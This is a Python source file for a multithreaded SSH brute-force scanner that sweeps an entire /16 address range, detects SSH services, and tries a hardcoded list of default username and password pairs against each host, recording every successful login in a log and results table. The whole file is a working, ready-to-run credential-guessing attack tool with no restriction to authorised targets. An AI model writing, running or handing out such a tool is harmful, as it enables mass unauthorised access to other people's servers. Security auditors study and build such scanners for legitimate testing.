import socket
import paramiko
import threading
from queue import Queue
from rich.console import Console
from rich.progress import Progress, TextColumn, BarColumn, TimeElapsedColumn, MofNCompleteColumn
from rich.table import Table
from rich import box
import time
import logging
import argparse
import sys # Import sys for exit

console = Console()

BANNER = """
  Simplified SSH Port 22 Scanner - LION Edition
  Scanning for SSH Port 22 and Common Credentials...
"""
console.print(BANNER, style="bold bright_cyan")

logging.basicConfig(level=logging.INFO, filename="ssh_port22_scanner.log", filemode="w",
                    format="%(asctime)s - %(levelname)s - %(message)s")

DEFAULT_CREDENTIALS = [ # Common credentials
    ("root", "root"),
    ("root", "password"),
    ("admin", "admin"),
    ("admin", "password"),
    ("user", "password"),
    ("user", "user")
]

parser = argparse.ArgumentParser(description="Simplified SSH Port 22 Scanner")
parser.add_argument("ip_prefix_xx_xx", help="IP prefix (xx.xx) to scan Class B range (e.g., 192.168)")
parser.add_argument("-t", "--threads", type=int, default=100, help="Number of threads (default: 100)")
parser.add_argument("-to", "--timeout", type=float, default=3.0, help="Connection timeout (default: 3.0 seconds)")
args = parser.parse_args()

logging.getLogger().setLevel(logging.INFO) # Set log level to INFO

CREDENTIALS = DEFAULT_CREDENTIALS # Use default credentials directly
SCAN_PORTS = [22] # Scan only port 22
queue = Queue()
MAX_THREADS = args.threads
TIMEOUT = args.timeout
FOUND_VULNERABLE = []


def check_ssh(ip, port, progress, task_id):
    """Check SSH credentials on a single IP:port 22."""
    def attempt_login(username, password):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(ip, port=port, username=username, password=password, timeout=TIMEOUT)
            banner = ssh.transport.get_server_banner()
            return banner
        except (paramiko.AuthenticationException, paramiko.SSHException, socket.error) as e:
            logging.debug(f"Login failed {ip}:{port} {username}:{password} - {type(e).__name__}: {e}")
            return None
        finally:
            ssh.close()

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(TIMEOUT)
            if sock.connect_ex((ip, port)) != 0:
                return  # Port is closed

        if not is_ssh_service(ip, port): # Check if it is SSH service
            logging.warning(f"Non-SSH service on {ip}:{port}")
            progress.update(task_id, advance=1, visible=False)
            return

        for username, password in CREDENTIALS:
            banner = attempt_login(username, password)
            if banner:
                FOUND_VULNERABLE.append({'ip': ip, 'port': port, 'username': username, 'password': password, 'banner': banner})
                console.print(f"[green][+] Vulnerable: {ip}:{port} - {username}:{password} - Banner: {banner}[/green]")
                logging.info(f"Vulnerable host found: {ip}:{port} - {username}:{password} - Banner: {banner}")
                break

    except Exception as e:
        console.print(f"[red][!][/red] Error checking {ip}:{port}: {e}")
        logging.error(f"Error checking {ip}:{port}: {e}")
    finally:
        progress.update(task_id, advance=1)


def is_ssh_service(ip, port, timeout=2):
    """Simple check if port is likely SSH."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        banner = sock.recv(1024).decode('utf-8', errors='ignore')
        sock.close()
        return "SSH" in banner
    except Exception:
        return False


def worker(progress, task_id):
    """Worker thread function."""
    while True:
        ip_port = queue.get()
        ip, port = ip_port.split(':')
        check_ssh(ip, int(port), progress, task_id)
        queue.task_done()


def show_results():
    """Display scan results in a table."""
    if FOUND_VULNERABLE:
        table = Table(box=box.ROUNDED, title="[bold bright_cyan]Vulnerable SSH Hosts - Port 22 Scan[/bold bright_cyan]", header_style="bold bright_cyan")
        table.add_column("IP Address", style="cyan")
        table.add_column("Port", style="magenta")
        table.add_column("Username", style="yellow")
        table.add_column("Password", style="yellow")
        table.add_column("SSH Banner", style="green", overflow="fold")
        for host in FOUND_VULNERABLE:
            table.add_row(host['ip'], str(host['port']), host['username'], host['password'], host['banner'] or "[italic red]N/A[/italic red]")
        console.print("\n")
        console.print(table)
    else:
        console.print("\n[bold yellow]No vulnerable hosts found on port 22 with default credentials.[/bold yellow]")


def main():
    """Main scan function."""
    try:
        ip_prefix_xx_xx = args.ip_prefix_xx_xx
        octets = ip_prefix_xx_xx.split('.')
        if len(octets) != 2 or not all(o.isdigit() and 0 <= int(o) <= 255 for o in octets):
            console.print("[bold red][!] Invalid IP prefix format. Use xx.xx format (e.g., 192.168).[/bold red]")
            sys.exit(1)

        ips = [f"{ip_prefix_xx_xx}.{i}.{j}" for i in range(256) for j in range(256)] # Class B range
        console.print(f"\n[bold blue][*] Scanning Class B range: {ip_prefix_xx_xx}.x.x ({len(ips)} IPs) on Port 22[/bold blue]")
        console.print(f"[*] Testing [yellow]{len(CREDENTIALS)}[/yellow] default credentials.")
        console.print(f"[*] Threads: [cyan]{MAX_THREADS}[/cyan], Timeout: [cyan]{TIMEOUT}s[/cyan]\n")

        start_time = time.time()
        total_tasks = len(ips)

        with Progress(TextColumn("[progress.description]{task.description}"), BarColumn(), MofNCompleteColumn(),
                      TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), TimeElapsedColumn(), transient=True) as progress:
            task_id = progress.add_task("[cyan]Scanning SSH Port 22...", total=total_tasks)

            for _ in range(MAX_THREADS):
                threading.Thread(target=worker, args=(progress, task_id), daemon=True).start()

            for ip in ips:
                for port in SCAN_PORTS: # Only port 22 in SCAN_PORTS
                    queue.put(f"{ip}:{port}")
            queue.join()

        scan_duration = time.time() - start_time
        console.print(f"\n[bold blue][*] Scan completed in [yellow]{scan_duration:.2f} seconds[/yellow].[/bold blue]")
        show_results()

    except KeyboardInterrupt:
        console.print("\n[bold red][!] Scan interrupted by user![/bold red]")
        show_results()
        sys.exit(1)
    except Exception as e:
        console.print(f"[bold red][CRITICAL ERROR][/bold red] Unhandled exception in main: {e}")
        logging.critical(f"Unhandled main exception: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
